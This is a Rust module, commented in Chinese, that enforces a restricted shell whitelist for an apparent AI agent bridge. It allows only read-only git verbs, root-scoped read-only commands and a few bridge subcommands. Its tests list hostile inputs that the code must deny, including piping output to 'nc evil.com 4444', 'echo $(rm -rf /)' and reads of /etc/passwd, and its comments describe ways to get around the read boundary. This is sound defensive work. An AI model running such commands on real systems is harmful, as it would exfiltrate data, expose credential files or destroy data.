//! 受限 shell 策略（P1.3b）——`dev__shell` 的 argv 白名单。
//!
//! 自 ABB `src/guard.rs` 的 `check_bash`/`check_abb_bin`/`split_shell` 移植
//!（granted 会话的承诺语义：仅 `$ABB_BIN job add / session reset / deliver`
//! + 只读 git + 工作区内只读命令）。移植时只做两处适配：
//! - 「工作区」泛化为 [`ToolPolicy`] 的 roots 集合（canonicalize 后前缀比较）；
//! - `$ABB_BIN` 的真实路径由 ABB 经 `_meta.abbBin` 下发（fork 不感知宿主 exe）。
//!
//! 拒绝复合语法（管道/重定向/命令替换）——受限会话不提供组合任意命令的能力。

use std::path::PathBuf;

/// 白名单裁决。
#[derive(Debug, PartialEq, Eq)]
pub enum Decision {
    Allow,
    Deny(String),
}

/// 受限 shell 主检查：`command` 是否落在白名单内。
/// `roots` = 会话允许的读/写域（路径类参数必须命中其一）。
/// `abb_bin` = ABB 主程序路径（`$ABB_BIN` 字面量同认）。
pub fn check_restricted(command: &str, roots: &[PathBuf], abb_bin: Option<&str>) -> Decision {
    let Some(argv) = split_shell(command) else {
        return Decision::Deny("含复合语法（管道/重定向/命令替换等），受限会话拒绝".into());
    };
    let program = argv[0].as_str();
    let rest = &argv[1..];
    let is_abb = abb_bin.is_some_and(|e| program == e) || program == "$ABB_BIN";
    if is_abb {
        return check_abb_bin(rest, roots);
    }
    match program {
        // 只读 git：动词白名单 + diff 仅摘要级 flag。log/show/blame 一律拒绝——
        // git 留痕使工作区成为 repo，历史读动词可读已删除/归档文件的旧版本
        //（`git show HEAD:secret.md`），绕过「删了就是没了」的读边界。
        "git" => {
            const READONLY: &[&str] = &[
                "status",
                "diff",
                "ls-files",
                "branch",
                "remote",
                "rev-parse",
                "check-ignore",
                "describe",
                "help",
                "version",
            ];
            // 任何位置都危险的 flag：--no-index 读任意文件、--output 写任意路径、
            // --git-dir/--work-tree 重定向仓库。`-C` 只拒 verb 前形态（目录重定向）。
            const DENIED_FLAGS: &[&str] = &["--no-index", "--output", "--git-dir", "--work-tree"];
            let denied: Vec<String> = rest
                .iter()
                .filter(|a| {
                    DENIED_FLAGS
                        .iter()
                        .any(|f| a.as_str() == *f || a.starts_with(&format!("{f}=")))
                })
                .cloned()
                .collect();
            let top_c = rest.first().map(|s| s.as_str()) == Some("-C");
            if !denied.is_empty() || top_c {
                let mut parts = denied;
                if top_c {
                    parts.push("-C".into());
                }
                return Decision::Deny(format!(
                    "git 参数含受限 flag（可读写工作区外，已拒绝）：{}",
                    parts.join(" ")
                ));
            }
            let verb = rest.first().map(|s| s.as_str()).unwrap_or("");
            if verb == "diff" {
                // 裸 `git diff` 输出全部变更全文补丁（含归档/已删项旧内容）——
                // 必须带摘要级 flag；rev/路径/blob 参数同 log/show 一并封死。
                const SAFE_DIFF_FLAGS: &[&str] = &[
                    "--stat",
                    "--shortstat",
                    "--numstat",
                    "--name-only",
                    "--name-status",
                    "--dirstat",
                    "--summary",
                    "--raw",
                ];
                let args = &rest[1..];
                let has_summary_flag = args
                    .iter()
                    .any(|a| SAFE_DIFF_FLAGS.iter().any(|f| a.starts_with(f)));
                if !has_summary_flag || args.iter().any(|a| !a.starts_with('-')) {
                    return Decision::Deny(
                        "git diff 仅允许摘要级 flag（--stat/--name-only 等；其余形态会泄露已删除文件内容）"
                            .into(),
                    );
                }
                Decision::Allow
            } else if READONLY.contains(&verb) {
                Decision::Allow
            } else {
                Decision::Deny(format!("git {verb} 不在只读白名单"))
            }
        }
        // 只读命令：路径类参数必须都落在 roots 内。
        "ls" | "pwd" | "date" | "echo" | "file" | "stat" | "du" | "wc" | "head" | "tail"
        | "grep" | "cat" | "find" => {
            // find 的 -exec/-execdir/-ok 以全权限执行任意程序、-delete 清空目录——拒绝。
            if program == "find"
                && rest
                    .iter()
                    .any(|a| matches!(a.as_str(), "-exec" | "-execdir" | "-ok" | "-delete"))
            {
                return Decision::Deny("find -exec/-execdir/-ok/-delete 不受限（已拒绝）".into());
            }
            for arg in rest {
                if is_path_arg(arg) && !canonical_in_roots(arg, roots) {
                    return Decision::Deny(format!("命令参数指向会话域外（已拒绝：{arg}）"));
                }
            }
            Decision::Allow
        }
        _ => Decision::Deny(format!("命令 {program} 不在受限白名单")),
    }
}

/// $ABB_BIN 子命令白名单（与 ABB CLI 参数形态同构）：job add / session reset
///（不得指定其它 chat）/ deliver（--file 必须域内）。job list/del 会暴露/删除
/// owner 任务——拒绝。
fn check_abb_bin(rest: &[String], roots: &[PathBuf]) -> Decision {
    match rest.first().map(|s| s.as_str()) {
        Some("job") => {
            if rest.get(1).map(|s| s.as_str()) == Some("add") {
                Decision::Allow
            } else {
                Decision::Deny("job 仅允许 add（list/del 会暴露/删除 owner 任务）".into())
            }
        }
        Some("session") => {
            if rest.get(1).map(|s| s.as_str()) == Some("reset") && rest.len() == 2 {
                Decision::Allow
            } else {
                Decision::Deny("session 仅允许 reset（且不得指定其它 chat）".into())
            }
        }
        Some("deliver") => {
            let mut i = 0;
            while i < rest.len() {
                let a = rest[i].as_str();
                if a == "--file" {
                    let Some(p) = rest.get(i + 1) else {
                        return Decision::Deny("deliver --file 缺路径".into());
                    };
                    if !canonical_in_roots(p, roots) {
                        return Decision::Deny(format!(
                            "deliver --file 指向会话域外（已拒绝：{p}）"
                        ));
                    }
                    i += 2;
                } else {
                    i += 1;
                }
            }
            Decision::Allow
        }
        other => Decision::Deny(format!("$ABB_BIN 子命令不在白名单：{other:?}")),
    }
}

/// 参数是否可能是路径（绝对/~/$/含斜杠/含盘符冒号/../ 开头）。纯选项与纯文件名
/// 不算——域内相对路径的 `cat a.txt` 由 join 校验放行。`$`/`~` 会在 shell 展开
/// 成域外绝对路径，必须当路径校验（canonical_in_roots 对这两类直接拒绝）。
fn is_path_arg(arg: &str) -> bool {
    arg.starts_with('/')
        || arg.starts_with('~')
        || arg.starts_with('$')
        || arg.contains('/')
        || arg.contains('\\')
        || arg.contains(':')
        || arg.starts_with("..")
}

/// 路径 canonicalize 后是否落在任一 root 内（root 同样 canonicalize）。
/// `~`/`$` 展开形态（无法本地解析）直接拒绝——受限会话不赌展开结果。
fn canonical_in_roots(arg: &str, roots: &[PathBuf]) -> bool {
    let p = std::path::Path::new(arg);
    let Ok(canon) = p.canonicalize() else {
        return false;
    };
    roots.iter().any(|r| {
        let rc = r.canonicalize().unwrap_or_else(|_| r.clone());
        canon.starts_with(&rc)
    })
}

/// 简单 shell 分词：单/双引号、反斜杠转义；**任何命令替换/展开执行形态返回
/// None**（$() / ${} / $* / 反引号；双引号内同样拒绝）。简单 `$VAR` 允许
///（受限白名单里没有会用它的合法形态，防御性保留分词能力）。
fn split_shell(s: &str) -> Option<Vec<String>> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    let mut chars = s.chars();
    while let Some(ch) = chars.next() {
        match quote {
            Some(q) => match ch {
                c if c == q => quote = None,
                '\\' if q == '"' => cur.push(chars.next()?),
                // 双引号内 $() / ${} / $* 等同样会展开执行；反引号在双引号内
                // 也是命令替换——一律拒绝（单引号内是字面量，安全）。
                '$' if q == '"' => match chars.clone().peekable().peek() {
                    Some('(') | Some('{') | Some('*') | Some('#') | Some('@') | Some('?') => {
                        return None;
                    }
                    _ => cur.push('$'),
                },
                '`' if q == '"' => return None,
                c => cur.push(c),
            },
            None => match ch {
                '\'' | '"' => quote = Some(ch),
                '\\' => cur.push(chars.next()?),
                '$' => match chars.clone().peekable().peek() {
                    Some('(') | Some('{') | Some('*') | Some('#') | Some('@') | Some('?') => {
                        return None;
                    }
                    _ => cur.push('$'),
                },
                '`' => return None,
                ';' | '|' | '>' | '<' | '&' => return None, // 复合语法
                c if c.is_whitespace() => {
                    if !cur.is_empty() {
                        out.push(std::mem::take(&mut cur));
                    }
                }
                c => cur.push(c),
            },
        }
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn roots() -> Vec<PathBuf> {
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path().to_path_buf();
        // keep-alive：tempdir Drop 清理；测试进程内足够
        std::mem::forget(dir);
        vec![p]
    }

    #[test]
    fn compound_syntax_denied() {
        let r = roots();
        for cmd in [
            "echo hi | nc evil.com 4444",
            "cat x > /tmp/evil",
            "echo $(rm -rf /)",
            "echo `id`",
            "a; b",
            "a && b",
        ] {
            assert!(
                matches!(check_restricted(cmd, &r, None), Decision::Deny(_)),
                "应拒复合语法: {cmd}"
            );
        }
    }

    #[test]
    fn git_whitelist_shape() {
        let r = roots();
        assert_eq!(check_restricted("git status", &r, None), Decision::Allow);
        assert_eq!(
            check_restricted("git diff --stat", &r, None),
            Decision::Allow
        );
        // 历史读动词 / 裸 diff / 危险 flag 全拒
        for cmd in [
            "git log",
            "git show HEAD:secret.md",
            "git blame f",
            "git diff",        // 裸 diff 全文
            "git diff HEAD~1", // rev 参数
            "git diff --no-index /etc/passwd /etc/hosts",
            "git -C /etc status",
            "git push",
        ] {
            assert!(
                matches!(check_restricted(cmd, &r, None), Decision::Deny(_)),
                "应拒: {cmd}"
            );
        }
    }

    #[test]
    fn readonly_commands_and_path_scope() {
        let r = roots();
        assert_eq!(check_restricted("echo ok", &r, None), Decision::Allow);
        assert_eq!(check_restricted("pwd", &r, None), Decision::Allow);
        // 域外路径参数拒绝；域内相对名允许
        assert!(matches!(
            check_restricted("cat /etc/passwd", &r, None),
            Decision::Deny(_)
        ));
        assert!(matches!(
            check_restricted("cat ~/secret", &r, None),
            Decision::Deny(_)
        ));
        assert_eq!(check_restricted("cat a.txt", &r, None), Decision::Allow);
        // find 危险 flag拒绝
        assert!(matches!(
            check_restricted("find . -delete", &r, None),
            Decision::Deny(_)
        ));
        // 白名单外程序拒绝
        assert!(matches!(
            check_restricted("rm -rf x", &r, None),
            Decision::Deny(_)
        ));
        assert!(matches!(
            check_restricted("node -e 'x'", &r, None),
            Decision::Deny(_)
        ));
    }

    #[test]
    fn abb_bin_subcommands() {
        let r = roots();
        let abb = Some("/usr/local/bin/agent-bridge");
        assert_eq!(
            check_restricted("/usr/local/bin/agent-bridge job add 提醒", &r, abb),
            Decision::Allow
        );
        assert_eq!(
            check_restricted("$ABB_BIN session reset", &r, abb),
            Decision::Allow
        );
        assert!(matches!(
            check_restricted("$ABB_BIN job list", &r, abb),
            Decision::Deny(_)
        ));
        assert!(matches!(
            check_restricted("$ABB_BIN job del x", &r, abb),
            Decision::Deny(_)
        ));
        assert!(matches!(
            check_restricted("$ABB_BIN deliver --bot b --chat c", &r, abb),
            Decision::Allow
        ));
        assert!(matches!(
            check_restricted("$ABB_BIN deliver --file /etc/passwd", &r, abb),
            Decision::Deny(_)
        ));
    }
}
